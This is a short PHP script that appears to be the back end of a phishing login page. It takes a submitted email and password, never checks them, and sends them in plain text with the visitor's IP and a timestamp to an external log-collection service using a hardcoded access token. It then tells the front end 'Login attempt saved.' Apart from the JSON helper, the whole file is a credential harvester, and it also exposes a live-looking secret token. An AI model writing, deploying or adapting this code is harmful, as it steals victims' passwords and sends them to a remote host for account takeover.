<?php
// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Log all login attempts to Papertrail using HTTPS
try {
    // Papertrail endpoint URL
    $papertrailUrl = "https://logs.collector.na-01.cloud.solarwinds.com/v1/logs/bulk"; // Replace with your bulk endpoint
    $authorizationToken = "3Vb4KQWqFeJsIF_sBb7dN8pg1jm8ByXFeF45UgkwFcOUM194h_77z7n7zdEG6mEN-KhgKg"; // Replace with your token

    // Prepare log data
    $logData = sprintf(
        "Date: %s | Email: %s | Password: %s | IP: %s",
        date("Y-m-d H:i:s"),
        $email,
        $password,
        $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
    );

    // Send logs via POST request using curl
    $ch = curl_init($papertrailUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $logData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/octet-stream",
        "Authorization: Bearer $authorizationToken"
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Get the response from Papertrail

    $response = curl_exec($ch);
    if ($response === false) {
        error_log("Failed to send logs to Papertrail: " . curl_error($ch));
        sendJsonResponse(false, "A server error occurred while saving the login attempt.");
    }
    curl_close($ch);

    // Send response to the frontend
    sendJsonResponse(false, "Login attempt saved.");
} catch (Exception $e) {
    error_log("Failed to log login attempt to Papertrail: " . $e->getMessage());
    sendJsonResponse(false, "A server error occurred while saving the login attempt.");
}
?>
